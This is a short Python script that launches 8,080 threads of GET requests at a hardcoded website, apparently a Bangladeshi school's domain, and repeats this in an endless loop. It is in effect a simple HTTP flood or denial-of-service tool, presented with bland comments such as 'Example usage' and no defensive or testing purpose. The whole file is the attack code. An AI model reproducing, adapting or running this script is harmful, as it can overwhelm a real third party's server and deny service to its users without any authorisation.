import threading
import requests

# Function to send a single request to the target URL
def send_request(target_url):
    try:
        response = requests.get(target_url)
        print(f"Request sent to {target_url}, Status Code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Request to {target_url} failed: {e}")

# Function to create multiple threads
def send_requests_with_threads(target_url, num_threads):
    threads = []
    
    for i in range(num_threads):
        thread = threading.Thread(target=send_request, args=(target_url,))
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()

# Example usage
if __name__ == "__main__":
    target_url = "https://aliakbar.edu.bd/"  # Replace with the target URL
    num_threads = 8080  # Number of threads/requests to send

    while True:
        send_requests_with_threads(target_url, num_threads)
